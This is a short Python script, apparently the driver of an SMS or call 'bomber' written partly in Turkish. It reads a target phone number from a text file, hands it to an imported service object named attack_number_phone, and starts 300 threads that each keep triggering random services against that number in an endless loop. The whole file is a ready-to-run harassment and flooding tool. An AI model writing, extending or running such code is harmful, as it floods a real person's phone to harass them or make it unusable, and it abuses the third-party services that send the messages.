import sys, os
from StructService import Distribution_Service
from threading import Thread
from colorama import Fore
attack_number_phone = Distribution_Service()

def start(phone):
	attack_number_phone.phone(phone)

	while True:
		try:
			attack_number_phone.random_service()
		except Exception as ex:
			print(ex)

file = open ("numara.txt", 'r')
phone = file.read()

try:
	attack_number_phone.phone(phone)
except:
	print(Fore.RED + 'НATALI NUMARA GİRİLDİ')
	sys.exit()

for i in range(300):
    th = Thread(target=start, args=(phone, ))
    th.start()
